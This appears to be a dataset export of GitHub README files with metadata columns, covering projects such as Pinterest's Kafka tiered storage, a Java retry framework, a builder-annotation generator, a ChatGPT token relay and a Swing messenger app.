Using Pinterest Tiered Storage for Apache Kafka® consists of the following high-level steps:
1. Have a remote storage system ready to accept reads and writes of log segments (e.g. Amazon S3 bucket)
2. Configure and start [ts-segment-uploader](ts-segment-uploader) on each Apache Kafka® broker
3. Use [ts-consumer](ts-consumer) to read from either the broker or the remote storage system
4. Monitor and manage the tiered storage system using the provided metrics and tools

Feel free to read into each module's README for more details.

# Architecture
![Architecture](docs/images/architecture.png)

# Current Status
**Pinterest Tiered Storage for Apache Kafka® is currently under active development and the APIs may change over time.**

It currently supports the following remote storage systems:
- Amazon S3

Some planned features and improvements:

- KRaft support
- More storage system support (e.g. HDFS)
- Integration with [PubSub Client](https://github.com/pinterest/psc) (backend-agnostic client library)

Contributions are always welcome!

# Ecosystem
Check out some of the other Pinterest projects designed to make PubSub more automated, efficient, and reliable:
- [PubSub Client](https://github.com/pinterest/psc): A backend-agnostic client library for PubSub systems
- [MemQ](https://github.com/pinterest/memq): An efficient, scalable cloud native PubSub system
- [Orion](https://github.com/pinterest/orion): A generalized and pluggable management and automation platform for stateful distributed systems, such as Apache Kafka® and MemQ

# Maintainers
- Vahid Hashemian
- Jeff Xiang

# License
Pinterest Tiered Storage for Apache Kafka® is distributed under Apache License, Version 2.0.

# Trademark
Apache®️, Apache Kafka, and Kafka are trademarks of the Apache Software Foundation.
",0,0,9,apache-2.0,4.0,"['pinterest', 'tiered', 'storage', 'apache', 'pinterest', 'tiered', 'storage', 'apache', 'framework', 'allows', 'broker', 'offload', 'finalized', 'log', 'segment', 'remote', 'storage', 'system', 'allows', 'apache', 'maintain', 'smaller', 'disk', 'footprint', 'reduce', 'need', 'expensive', 'storage', 'broker', 'framework', 'also', 'provides', 'consumer', 'client', 'consume', 'broker', 'remote', 'storage', 'system', 'pinterest', 'implementation', 'tiered', 'storage', 'apache', 'provides', 'approach', 'tiered', 'storage', 'see', 'difference', 'pinterest', 'vs', 'apache', 'tiered', 'storage', 'consists', 'two', 'main', 'component', 'uploader', 'continuous', 'process', 'run', 'apache', 'broker', 'uploads', 'finalized', 'log', 'segment', 'remote', 'storage', 'system', 'amazon', 'unique', 'prefix', 'per', 'cluster', 'topic', 'consumer', 'consumer', 'client', 'capable', 'consuming', 'tiered', 'storage', 'log', 'segment', 'apache', 'cluster', 'third', 'module', 'contains', 'common', 'class', 'interface', 'used', 'module', 'metric', 'storageendpointprovider', 'etc', 'feel', 'free', 'read', 'module', 'readme', 'detail', 'tiered', 'storage', 'apache', 'distributed', 'event', 'streaming', 'platform', 'store', 'partitioned', 'replicated', 'log', 'segment', 'disk', 'configurable', 'retention', 'period', 'however', 'data', 'volume', 'retention', 'period', 'grow', 'disk', 'footprint', 'apache', 'cluster', 'become', 'expensive', 'tiered', 'storage', 'allows', 'broker', 'offload', 'finalized', 'log', 'segment', 'remote', 'storage', 'system', 'reducing', 'need', 'expensive', 'storage', 'broker', 'tiered', 'storage', 'maintain', 'smaller', 'overall', 'broker', 'footprint', 'reducing', 'operational', 'cost', 'retain', 'data', 'longer', 'period', 'time', 'avoiding', 'horizontal', 'vertical', 'scaling', 'apache', 'cluster', 'reduce', 'cpu', 'network', 'disk', 'utilization', 'broker', 'reading', 'directly', 'remote', 'storage', 'pinterest', 'vs', 'apache', 'tiered', 'storage', 'apache', 'tiered', 'storage', 'provides', 'native', 'offering', 'tiered', 'storage', 'apache', 'available', 'starting', 'apache', 'native', 'tiered', 'storage', 'implementation', 'meaning', 'broker', 'process', 'responsible', 'offloading', 'finalized', 'log', 'segment', 'remote', 'storage', 'broker', 'always', 'critical', 'path', 'consumption', 'pinterest', 'tiered', 'storage', 'skip', 'broker', 'pinterest', 'implementation', 'tiered', 'storage', 'meaning', 'tiered', 'storage', 'process', 'run', 'separate', 'process', 'alongside', 'apache', 'server', 'process', 'broker', 'always', 'critical', 'path', 'consumption', 'allows', 'flexibility', 'adopting', 'tiered', 'storage', 'better', 'accommodates', 'unpredictable', 'consumption', 'pattern', 'key', 'advantage', 'approach', 'need', 'upgrade', 'broker', 'native', 'offering', 'requires', 'upgrading', 'broker', 'version', 'support', 'tiered', 'storage', 'approach', 'skip', 'broker', 'entirely', 'consumption', 'mode', 'consumption', 'loop', 'touch', 'broker', 'allowing', 'unpredictable', 'spike', 'consumption', 'pattern', 'without', 'affecting', 'broker', 'see', 'memq', 'pubsub', 'system', 'us', 'approach', 'natively', 'support', 'consumer', 'backfills', 'replay', 'without', 'affecting', 'broker', 'cpu', 'broker', 'critical', 'path', 'consumption', 'consumer', 'backfills', 'replay', 'done', 'without', 'needing', 'keep', 'additional', 'cpu', 'buffer', 'broker', 'support', 'surge', 'avoid', 'transfer', 'cost', 'native', 'approach', 'add', 'network', 'cost', 'factor', 'consumer', 'approach', 'avoids', 'cost', 'consumer', 'reading', 'directly', 'remote', 'storage', 'faster', 'adoption', 'iteration', 'improvement', 'tiered', 'storage', 'solution', 'let', 'adopt', 'upgrade', 'tiered', 'storage', 'without', 'waiting', 'apache', 'upgrade', 'improvement', 'bug', 'fix', 'new', 'feature', 'released', 'independently', 'apache', 'release', 'highlight', 'broker', 'independent', 'tiered', 'storage', 'solution', 'designed', 'think', 'better', 'skip', 'broker', 'entirely', 'consumption', 'consumer', 'read', 'broker', 'tiered', 'storage', 'backend', 'filesystem', 'mode', 'consumption', 'loop', 'touch', 'broker', 'allowing', 'reduction', 'broker', 'resource', 'utilization', 'pluggable', 'storage', 'backends', 'framework', 'designed', 'partitioning', 'salting', 'configurable', 'allow', 'bucket', 'allowing', 'better', 'scalability', 'avoiding', 'request', 'rate', 'hotspot', 'fault', 'tolerant', 'broker', 'restarts', 'replacement', 'leadership', 'change', 'common', 'apache', 'operation', 'issue', 'handled', 'gracefully', 'metric', 'comprehensive', 'metric', 'provided', 'monitoring', 'alerting', 'purpose', 'quick', 'start', 'detailed', 'quickstart', 'instruction', 'available', 'usage', 'using', 'pinterest', 'tiered', 'storage', 'apache', 'consists', 'following', 'step', 'remote', 'storage', 'system', 'ready', 'accept', 'read', 'writes', 'log', 'segment', 'amazon', 'bucket', 'configure', 'start', 'apache', 'broker', 'use', 'read', 'either', 'broker', 'remote', 'storage', 'system', 'monitor', 'manage', 'tiered', 'storage', 'system', 'using', 'provided', 'metric', 'tool', 'feel', 'free', 'read', 'module', 'readme', 'detail', 'architecture', 'current', 'status', 'pinterest', 'tiered', 'storage', 'apache', 'currently', 'active', 'development', 'apis', 'may', 'change', 'time', 'currently', 'support', 'following', 'remote', 'storage', 'system', 'amazon', 'planned', 'feature', 'improvement', 'kraft', 'support', 'storage', 'system', 'support', 'hdfs', 'integration', 'pubsub', 'client', 'client', 'library', 'contribution', 'always', 'welcome', 'ecosystem', 'check', 'pinterest', 'project', 'designed', 'make', 'pubsub', 'automated', 'efficient', 'reliable', 'pubsub', 'client', 'client', 'library', 'pubsub', 'system', 'memq', 'efficient', 'scalable', 'cloud', 'native', 'pubsub', 'system', 'orion', 'generalized', 'pluggable', 'management', 'automation', 'platform', 'stateful', 'distributed', 'system', 'apache', 'memq', 'maintainer', 'vahid', 'hashemian', 'jeff', 'xiang', 'license', 'pinterest', 'tiered', 'storage', 'apache', 'distributed', 'apache', 'license', 'version', 'trademark', 'apache', 'kafka', 'kafka', 'trademark', 'apache', 'software', 'foundation']","['storage', 'broker', 'tiered', 'apache', 'system']",0,0,0,"['pinterest', 'tiered', 'storage', 'apache', 'why', 'tiered', 'storage', 'pinterest', 'apache', 'tiered', 'storage', 'apache', 'tiered', 'storage', 'pinterest', 'tiered', 'storage', 'skip', 'broker', 'highlight', 'quick', 'start', 'usage', 'architecture', 'current', 'status', 'ecosystem', 'maintainer', 'license', 'trademark']",14,"['tiered', 'storage', 'pinterest', 'apache', 'why']",0,2.0,5.0,"[maven-dependency-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,4.0,1.0,7464,19.607142857142858,5.428051001821494,"['Apache Kafka® -> https://kafka.apache.org/', 'Apache Kafka® -> https://kafka.apache.org/', 'KIP-405 -> https://cwiki.apache.org/confluence/display/KAFKA/KIP-405%3A+Kafka+Tiered+Storage?uclick_id=11f222c6-967b-4935-98a9-cc88aafad7f5', 'MemQ -> https://github.com/pinterest/memq', 'PubSub Client -> https://github.com/pinterest/psc', 'PubSub Client -> https://github.com/pinterest/psc', 'MemQ -> https://github.com/pinterest/memq', 'Orion -> https://github.com/pinterest/orion']",8
burukeYou/fast-retry,main,"
 [![License](http://img.shields.io/badge/license-apache%202-brightgreen.svg)](https://github.com/burukeYou/fast-retry/blob/main/LICENSE)


# What is this?
Fast-Retry是一个高性能任务重试框架，支持百万级别任务的并发重试处理。
与主流的Spring-Retry, Guava-Retry等同步重试框架不同，Fast-Retry是一个支持异步重试框架，支持异步任务的重试、超时等待、回调。
Spring-Retry, Guava-Retry均无法支持大批量任务的重试，因为会占用过多线程资源导致大量任务在等待处理，随着任务数的增加，系统吞吐量大大降低，性能指数级降低，Fast-Retry的性能是前者的指数倍。

下图是三者的性能对比

- 测试线程池:  8个固定线程
- 单个任务逻辑:  轮询5次，隔2秒重试一次，总耗时10秒
- 未测预计公式：  当我们使用线程池的时候， 一般线程池中 总任务处理耗时 =  任务数/并发度 x 单个任务重试耗时


| 任务数  | FastRetry |    Spring-Retry     |     Guava-Retry     |
| :-----: | :-------: | :-----------------: | :-----------------: |
|    1    |   10秒    |        10秒         |        10秒         |
|   10    | 10.066秒  |      20.092秒       |      20.078秒       |
|   50    | 10.061秒  |      70.186秒       |      70.168秒       |
|   100   | 10.077秒  |      130.33秒       |      130.31秒       |
|   500   | 10.154秒  |      631.420秒      |      631.53秒       |
|  1000   | 10.237秒  |      1254.78秒      |      1256.28秒      |
|  5000   | 10.482秒  |  没测预计：6250秒   |  没测预计：6250秒   |
|  10000  | 10.686秒  |  没测预计：12520秒  |  没测预计：12520秒  |
| 100000  |  13.71秒  | 没测预计：125000秒  | 没测预计：125000秒  |
| 500000  |  28.89秒  | 没测预计：625000秒  | 没测预计：625000秒  |
| 1000000 |  58.05秒  | 没测预计：1250000秒 | 没测预计：1250000秒 |


可以看到即使是处理100万个任务，Fast-Retry的性能也比Spring-Retry和Guava-Retry处理在50个任务时的性能还要快的多的多，
这么快的秘密在于除了是异步，更重要是当别人在重试间隔里休息的时候，Fast-Retry还在不停忙命的工作着。

## 引入依赖
```xml
    <dependency>
        <groupId>io.github.burukeyou</groupId>
        <artifactId>fast-retry-all</artifactId>
        <version>0.2.0</version>
    </dependency>
```

# 快速开始
有以下三种方式去构建我们的重试任务

## 1、使用重试队列
```java
        ExecutorService executorService = Executors.newFixedThreadPool(8);
        RetryQueue queue = new FastRetryQueue(executorService);
        RetryTask<String> task = new RetryTask<String>() {
            int result = 0 ;
            @Override
            public long waitRetryTime() {
                return 2000;
            }

            @Override
            public boolean retry() {
                return ++result < 5;
            }

            @Override
            public String getResult() {
                return  result + """";
            }
        };
        CompletableFuture<String> future = queue.submit(task);
        log.info(""任务结束 结果:{}"",future.get());
```

## 2、使用FastRetryBuilder

```java
        RetryResultPolicy<String> resultPolicy = result -> result.equals(""444"");
        FastRetryer<String> retryer = FastRetryBuilder.<String>builder()
                .attemptMaxTimes(3)
                .waitRetryTime(3, TimeUnit.SECONDS)
                .retryIfException(true)
                .retryIfExceptionOfType(TimeoutException.class)
                .exceptionRecover(true)
                .resultPolicy(resultPolicy)
                .build();

        CompletableFuture<String> future = retryer.submit(() -> {
            log.info(""重试"");
            //throw new Exception(""test"");
            //int i = 1/0;
            if (0 < 10){
                throw new TimeoutException(""test"");
            }
            return ""444"";
        });

        String o = future.get();
        log.info(""结果{}"", o);
```

## 3、使用FastRetry注解
- 依赖Spring环境，所以需要在配置上加上@EnableFastRetry注解启用配置才生效
- 如果将结果类型使用CompletableFuture包装，自动进行异步轮询返回，否则同步阻塞等待重试结果。 

下面定义等价于 FastRetryer.execute方法
```
    @FastRetry(retryWait = @RetryWait(delay = 2))
    public String retryTask(){
        return ""success"";
    }
``` 

下面定义等价于 FastRetryer.submit方法,支持异步轮询
```
    @FastRetry(retryWait = @RetryWait(delay = 2))
    public CompletableFuture<String> retryTask(){
        return CompletableFuture.completedFuture(""success"");
    }
```


",0,2,1,apache-2.0,0.0,"['x', 'fastretry']","['x', 'fastretry']",0,0,0,"['what', 'this']",6,"['what', 'this']",5,30.0,2.0,"[org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.central:central-publishing-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,2.0,0.0,3699,108.66666666666669,6.450920245398773,['![License -> http://img.shields.io/badge/license-apache%202-brightgreen.svg'],1
jonas-grgt/bob,main,"# 👷‍Bob [![Maven Central](https://img.shields.io/maven-central/v/io.jonasg/bob-annotations.svg)](https://search.maven.org/artifact/io.jonasg/bob-annotations) [![License](https://img.shields.io/github/license/jonas-grgt/bob.svg)](https://opensource.org/licenses/Apache-2.0)


🪶Lightweight Builder generator for Java

## Why Bob?

Bob serves as a lightweight alternative to Lombok's `@Builder` annotation with additional 
features such as the ability to create Step Builders.

## Installation
### Maven
```xml
<dependency>
    <groupId>io.jonasg</groupId>
    <artifactId>bob-annotations</artifactId>
    <version>${bob.version}</version>
    <scope>compile</scope>
</dependency>
<dependency>
    <groupId>io.jonasg</groupId>
    <artifactId>bob-processor</artifactId>
    <version>${bob.version}</version>
    <scope>provided</scope>
</dependency>
```
### Gradle
```groovy
dependencies {
  annotationProcessor ""io.jonasg:bob-processor:"" + bobVersion
  compileOnly ""io.jonasg:bob-annotations:"" + bobVersion
}
```

## Getting Started

Annotate the class with `@Buildable` to generate a builder for it.
    
```java
package my.garage;

@Buildable
public class Car {
	
    private Brand brand;
    private String color;
    private BigDecimal price;
	
    public Car(Brand brand, String color, BigDecimal price) {
        this.brand = brand;
        this.color = color;
        this.price = price;
    }
}
```

## Usage

### Basic Usage

By default,
Bob will look for the constructor with the most parameters
and will create setters for all parameters that have a matching field name. 
For parameters
that do not have a corresponding field, the default value for that type will be used.
In example `null` for `Integer` and zero for `int`.

If your class contains multiple constructors that tie for having the most parameters,
the first one will be selected. 
See `@Buildable.Constructor` if you want to change this behavior.

```java
@Buildable
public class Car {
    private String color;
    private BigDecimal price;
    
    public Car(Brand brand, int year, String color, BigDecimal price) {
        this.color = color;
        this.price = price;
    }
    
}
```

When building a car instance in this way `new CarBuilder().color(""red"").price(BigDecimal.ZERO).build();`
The car will be instantiated with the following constructor call:

```java
new Car(null, 0, ""red"", BigDecimal.ZERO);
```

Because `brand` and `year` aren't fields the default value for the corresponding types are used.


### Different constructor

If you want to use a different constructor instead of the default selected one, annotated it with `@Buildable.Constructor`

### Builder Strategies

The Strategy enumeration defines the strategies by which builders behave.

#### Permissive

The default strategy,
allows the creation of an object
even if not all constructor parameters are set or if some are set to null.
Fields not explicitly set will default to their inherent values
(e.g., null for object references, 0 for numeric types, and false for booleans).
This strategy is suitable when not all fields need explicit initialization,
allowing more flexibility.

```java
@Buildable
class Car {
```

#### Step Wise

Implements a step builder pattern,
requiring fields
to be set in a structured sequence
defined by the selected constructor's parameters and explicitly marked mandatory fields
(see [Mandatory Fields](#Mandatory-Fields)).
Each step must be completed before proceeding to the next,
ensuring all fields are set before the object can be constructed.

```java
@Buildable(strategy = STEP_WISE)
class Car {
```

#### Strict
Requires all mandatory fields to be explicitly set.
If a field is not set,
or is set to null, the builder throws a `MandatoryFieldMissingException`.
This ensures that the object is fully initialized.

```java
@Buildable(strategy = STRICT)
class Car {
```

#### Allow Nulls
Enables setting mandatory fields to null explicitly,
combinable with `STRICT` and `STEP_WISE`.
If a field is omitted, the builder will throw a `MandatoryFieldMissingException`,
maintaining strict initialization but allowing null values for flexibility.

```java
@Buildable(strategy = { STRICT, ALLOW_NULLS })
class Car {
```
### Mandatory Fields

Fields can be marked as mandatory;
- through the `mandatoryFields` property of `@Buildable`
- through annotating the field with @Buildable.Mandatory.
 
Similar to the constructor parameters in the ENFORCED mode,
the omission of these required fields when building an object will trigger a MandatoryFieldMissingException.
This mechanism ensures that all necessary fields are set before an object is finalized.

```java
@Buildable(mandatoryFields = {""color""})
public class Car {
    private String color;
```

```java
@Buildable
public class Car {
    @Buildable.Mandatory
    private String color;
```
### Change Default Package
    
A `CarBuilder` class will be generated in the same package as the source class with *builder* as suffix.
For the car example this will be `my.garage.CarBuilder`

The location of the builder can be changed:

```java
@Buildable(packageName = ""my.other.garage"")
public class Car {
```

### Static Factory Method name

The `factoryName` `@Buildable` property allows:
- `STEP_WISE`: Rename builder starting method (e.g., builder to createProductBuilder).
- `PERMISSIVE/STRICT`: Add extra name to static factory method (for documentation/avoid conflicts).

```java
@Buildable(strategy = STEP_WISE, factoryName = ""car"")
public class Car {
```
Which will generate:
```java
CarBuilder.car();
```

### Pickup setter methods as buildable

When Bob encounters setters (with or without the set prefix)
and a corresponding field it will add the fields to the final builder.

In the below example,
if though `color` is not part of the constructor it will be part of the final generated Builder
because there is a setter available, which will be used.

```java
@Buildable
public class Car {
    private Brand brand;
    private String color;

    public Car(Brand brand) {
        this.brand = brand;
    }
	
    public void color(String color) {
        this.color = color;
    }
}
```
            
### Field exclusion

```java
@Buildable(excludeFields = {""brand"", ""color""})
public class Car {
```

### Setter prefix
      
By default Bob will generated setter methods consisting out of *new style setters* (`name(String name)` instead of `setName(String name)` or the default builder pattern setter style `withName(String name)`)
If you want to change the prefix of those setter methods you can:

```java
@Buildable(setterPrefix = ""with"")
public class Car {
```

### Records

Bob can work with Records and function just as normal java classes

```java
@Buildable
public record Record(String name, int age) {
}
```

### Generics

Bob is not afraid of generics

```java
@Buildable
public class Cup<T, R extends String> {
    private T contents;
    private R topping;
```

Can be used as:
    
```java
Cup<BigDecimal, String> string = new CupBuilder<BigDecimal, String>().topping(""cream"")
    .contents(BigDecimal.ZERO)
    .build();
```

or alternatively:

```java
CupBuilder.of(BigDecimal.class, String.class)
    .topping(""cream"")
    .contents(BigDecimal.ZERO)
    .build();
```
",6,5,1,apache-2.0,17.0,"['builder', 'generator', 'java', 'bob', 'bob', 'serf', 'lightweight', 'alternative', 'lombok', 'annotation', 'additional', 'feature', 'ability', 'create', 'step', 'builder', 'installation', 'maven', 'gradle', 'getting', 'started', 'annotate', 'class', 'generate', 'builder', 'usage', 'basic', 'usage', 'default', 'bob', 'look', 'constructor', 'parameter', 'create', 'setter', 'parameter', 'matching', 'field', 'name', 'parameter', 'corresponding', 'field', 'default', 'value', 'type', 'used', 'example', 'zero', 'class', 'contains', 'multiple', 'constructor', 'tie', 'parameter', 'first', 'one', 'selected', 'see', 'want', 'change', 'behavior', 'building', 'car', 'instance', 'way', 'car', 'instantiated', 'following', 'constructor', 'call', 'field', 'default', 'value', 'corresponding', 'type', 'used', 'different', 'constructor', 'want', 'use', 'different', 'constructor', 'instead', 'default', 'selected', 'one', 'annotated', 'builder', 'strategy', 'strategy', 'enumeration', 'defines', 'strategy', 'builder', 'behave', 'permissive', 'default', 'strategy', 'allows', 'creation', 'object', 'even', 'constructor', 'parameter', 'set', 'set', 'null', 'field', 'explicitly', 'set', 'default', 'inherent', 'value', 'null', 'object', 'reference', 'numeric', 'type', 'false', 'booleans', 'strategy', 'suitable', 'field', 'need', 'explicit', 'initialization', 'allowing', 'flexibility', 'step', 'wise', 'implement', 'step', 'builder', 'pattern', 'requiring', 'field', 'set', 'structured', 'sequence', 'defined', 'selected', 'constructor', 'parameter', 'explicitly', 'marked', 'mandatory', 'field', 'see', 'mandatory', 'field', 'step', 'must', 'completed', 'proceeding', 'next', 'ensuring', 'field', 'set', 'object', 'constructed', 'strict', 'requires', 'mandatory', 'field', 'explicitly', 'set', 'field', 'set', 'set', 'null', 'builder', 'throw', 'ensures', 'object', 'fully', 'initialized', 'allow', 'null', 'enables', 'setting', 'mandatory', 'field', 'null', 'explicitly', 'combinable', 'field', 'omitted', 'builder', 'throw', 'maintaining', 'strict', 'initialization', 'allowing', 'null', 'value', 'flexibility', 'mandatory', 'field', 'field', 'marked', 'mandatory', 'property', 'annotating', 'field', 'similar', 'constructor', 'parameter', 'enforced', 'mode', 'omission', 'required', 'field', 'building', 'object', 'trigger', 'mandatoryfieldmissingexception', 'mechanism', 'ensures', 'necessary', 'field', 'set', 'object', 'finalized', 'change', 'default', 'package', 'class', 'generated', 'package', 'source', 'class', 'builder', 'suffix', 'car', 'example', 'location', 'builder', 'changed', 'static', 'factory', 'method', 'name', 'property', 'allows', 'rename', 'builder', 'starting', 'method', 'builder', 'createproductbuilder', 'add', 'extra', 'name', 'static', 'factory', 'method', 'conflict', 'generate', 'pickup', 'setter', 'method', 'buildable', 'bob', 'encounter', 'setter', 'without', 'set', 'prefix', 'corresponding', 'field', 'add', 'field', 'final', 'builder', 'example', 'though', 'part', 'constructor', 'part', 'final', 'generated', 'builder', 'setter', 'available', 'used', 'field', 'exclusion', 'setter', 'prefix', 'default', 'bob', 'generated', 'setter', 'method', 'consisting', 'new', 'style', 'setter', 'instead', 'default', 'builder', 'pattern', 'setter', 'style', 'want', 'change', 'prefix', 'setter', 'method', 'records', 'bob', 'work', 'records', 'function', 'normal', 'java', 'class', 'generic', 'bob', 'afraid', 'generic', 'used', 'alternatively']","['field', 'builder', 'set', 'default', 'constructor']",3,0,0,"['maven', 'central', 'http', 'https', 'license', 'http', 'https', 'why', 'bob', 'installation', 'maven', 'gradle', 'get', 'start', 'usage', 'basic', 'usage', 'different', 'constructor', 'builder', 'strategy', 'permissive', 'step', 'wise', 'strict', 'allow', 'null', 'mandatory', 'field', 'change', 'default', 'package', 'static', 'factory', 'method', 'name', 'pickup', 'setter', 'method', 'buildable', 'field', 'exclusion', 'setter', 'prefix', 'record', 'generic']",22,"['maven', 'http', 'https', 'usage', 'field']",21,6.0,3.0,"[com.diffplug.spotless:spotless-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jreleaser:jreleaser-maven-plugin]",0.0,2.0,1.0,7226,31.32258064516129,5.433573635427394,"['![Maven Central -> https://img.shields.io/maven-central/v/io.jonasg/bob-annotations.svg', '![License -> https://img.shields.io/github/license/jonas-grgt/bob.svg']",2
Yanyutin753/refresh-gpt-chat,main,"# refresh-gpt-chat

![Docker Image Size (tag)](https://img.shields.io/docker/image-size/yangclivia/refresh-gpt-chat/latest)![Docker Pulls](https://img.shields.io/docker/pulls/yangclivia/refresh-gpt-chat)[![GitHub Repo stars](https://img.shields.io/github/stars/Yanyutin753/refresh-gpt-chat?style=social)](https://github.com/Yanyutin753/refresh-gpt-chat/stargazers)

### 不许白嫖，请给我免费的star⭐吧，十分感谢！

## 简介

#### [refresh-gpt-chat](https://github.com/Yanyutin753/refresh-gpt-chat) 中转oaifree或者PandoraToV1Api的/v1/chat/completions和v1/images/generations接口，把refresh_token当key使用，内含hashmap,自动更新access_token,完美继承pandoraNext留下的refresh_token,支持基本所有的模型，小白也能快速使用！

#### [refresh-gpt-chat](https://github.com/Yanyutin753/refresh-gpt-chat) Intercept the /v1/chat/completions and v1/images/generations interface of oaifree or PandoraToV1Api, use the refresh_token as the key, which contains a hashmap, automatically update the access_token, perfectly inherit the refresh_token left by pandoraNext, support almost all models, even beginners can use it quickly!

-----

> ## 功能特性
>
> * **通过refresh_token自动更新access_token**：方便使用
>
> * **通过refresh_token作为key进行使用**：更好放入one-api里面
>
> * **支持反代v1/images/generations接口**：调用dall-e-3画图更出色
>
> * **支持反代v1/audio/speech接口**：调用tts-1，文字转语音
>
> * **支持反代v1/audio/transcriptions接口**：调用whisper-1，语言转文字
>
> * **可适用于oaifree、PandoraToV1Api项目**：反代服务，直接使用
>
> * **自定义后缀**：防止url被滥用
>
> * **支持base64识图**：能转发识图接口
>
> * **回复打字机处理**：回复更流畅，减少卡顿
>
> * **个人部署**：保障隐私安全
>

## [✨点击查看文档站](https://apifox.com/apidoc/shared-4b9a7517-3f80-47a1-84fc-fcf78827a04a)

> [!important]
>
> * 本项目只提供转发接口🥰
> * 开源项目不易，请点个星星吧！！！

## Sponsor

### 如果你觉得我的开源项目对你有帮助，可以赞助我一杯咖啡嘛，十分感谢！！！

<img src=""https://github.com/Yanyutin753/RefreshToV1Api/assets/132346501/e5ab5e80-1cf2-4822-ae36-f9d0b11ed1b1"" width=""300"" height=""300"">

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=Yanyutin753/refresh-gpt-chat&type=Date)](https://star-history.com/#Yanyutin753/refresh-gpt-chat&Date)
",10,1,1,mit,0.0,"['intercept', 'interface', 'oaifree', 'use', 'key', 'contains', 'hashmap', 'automatically', 'update', 'perfectly', 'inherit', 'left', 'pandoranext', 'support', 'almost', 'model', 'even', 'beginner', 'use', 'quickly', 'important', 'sponsor', 'star', 'history']","['use', 'intercept', 'interface', 'oaifree', 'key']",0,0,0,"['https', 'https', 'intercept', 'interface', 'oaifree', 'use', 'key', 'contain', 'hashmap', 'automatically', 'update', 'perfectly', 'inherit', 'leave', 'pandoranext', 'support', 'almost', 'model', 'even', 'beginner', 'use', 'quickly', 'http', 'sponsor', 'star', 'history']",10,"['https', 'use', 'intercept', 'interface', 'oaifree']",0,0.0,1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0,1981,39.5,6.29535864978903,"['Docker Image Size (tag) -> https://img.shields.io/docker/image-size/yangclivia/refresh-gpt-chat/latest', 'Docker Pulls -> https://img.shields.io/docker/pulls/yangclivia/refresh-gpt-chat', '![GitHub Repo stars -> https://img.shields.io/github/stars/Yanyutin753/refresh-gpt-chat?style=social', 'refresh-gpt-chat -> https://github.com/Yanyutin753/refresh-gpt-chat', 'refresh-gpt-chat -> https://github.com/Yanyutin753/refresh-gpt-chat', '✨点击查看文档站 -> https://apifox.com/apidoc/shared-4b9a7517-3f80-47a1-84fc-fcf78827a04a', '![Star History Chart -> https://api.star-history.com/svg?repos=Yanyutin753/refresh-gpt-chat&type=Date']",7
DJ-Raven/java-messenger,main,"# Java Messenger

This is a simple messenger app built using Java Swing for the client-side GUI, Node.js for the server-side API, and Socket-IO for real-time communication. The graphical user interface (GUI) is styled using FlatLaf.

**This project is still in development.**

<img src=""https://github.com/DJ-Raven/java-messenger/blob/main/screenshot/sample-2.png?raw=true"" alt=""sample 2"" width=""400""/>&nbsp;
<img src=""https://github.com/DJ-Raven/java-messenger/blob/main/screenshot/sample-3.png?raw=true"" alt=""sample 3"" width=""400""/>&nbsp;

## Demo
[Download Demo Test](messenger-client/demo/messenger-test-1.4.0.jar?raw=true)

Run demo with `java -jar messenger-test-<version>.jar` or `double-click` (Requires Java 8 or newer)

### Client libraries used (Java)
| Name | GitHub |
| ------------ | ------------ |
| FlatLaf | https://github.com/JFormDesigner/FlatLaf |
| MiG Layout | https://github.com/mikaelgrev/miglayout |
| REST Assured | https://github.com/rest-assured/rest-assured |
| Socket.IO Java client | https://github.com/socketio/socket.io-client-java |
| JSON-Java | https://github.com/stleary/JSON-java?tab=readme-ov-file |
| JLayer | https://github.com/umjammer/jlayer |
| mp3agic | https://github.com/mpatric/mp3agic |
| Thumbnailator | https://github.com/coobird/thumbnailator |
| Swing Modal Dialog | https://github.com/DJ-Raven/swing-modal-dialog |
### Server libraries used (Nodejs)
| Name | GitHub |
| ------------ | ------------ |
| Express | https://github.com/expressjs/express |
| socket.io | https://github.com/socketio/socket.io |
| jsonwebtoken | https://github.com/auth0/node-jsonwebtoken |
| bcrypt.js | https://github.com/dcodeIO/bcrypt.js |
| BlurHash | https://github.com/woltapp/blurhash/tree/master |
| Multer | https://github.com/expressjs/multer |
| MySQL2 | https://github.com/sidorares/node-mysql2 |
| nodemon `dev`| https://github.com/remy/nodemon |
| and more ... |  |
",0,0,1,mit,3.0,"['java', 'messenger', 'simple', 'messenger', 'app', 'built', 'using', 'java', 'swing', 'gui', 'api', 'communication', 'graphical', 'user', 'interface', 'gui', 'styled', 'using', 'flatlaf', 'project', 'still', 'development', 'demo', 'download', 'demo', 'test', 'run', 'demo', 'requires', 'java', 'newer', 'client', 'library', 'used', 'java', 'name', 'github', 'flatlaf', 'http', 'mig', 'layout', 'http', 'rest', 'assured', 'http', 'java', 'client', 'http', 'http', 'jlayer', 'http', 'http', 'thumbnailator', 'http', 'swing', 'modal', 'dialog', 'http', 'server', 'library', 'used', 'nodejs', 'name', 'github', 'express', 'http', 'http', 'jsonwebtoken', 'http', 'http', 'blurhash', 'http', 'multer', 'http', 'http', 'nodemon', 'http']","['http', 'java', 'demo', 'messenger', 'using']",0,4,0,"['java', 'messenger', 'demo', 'client', 'library', 'use', 'java', 'server', 'library', 'use', 'nodejs']",4,"['java', 'library', 'use', 'messenger', 'demo']",0,0.0,1.0,[],0.0,1.0,0.0,1911,67.5,4.988888888888889,[],0
javpower/easy-flv,main,"<!-- Easy-FLV: Java RTSP/RTMP to FLV Converter -->
# 📺 Easy-FLV: Java RTSP/RTMP to FLV Converter

[![GitHub stars](https://img.shields.io/github/stars/javpower/easy-flv.svg)](https://github.com/javpower/easy-flv) 
[![GitHub issues](https://img.shields.io/github/issues/javpower/easy-flv.svg)](https://github.com/javpower/easy-flv/issues) 
[![Apache License 2.0](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0) 
[![Java Version](https://img.shields.io/badge/java-1.8+-orange.svg)](https://adoptopenjdk.net/) 
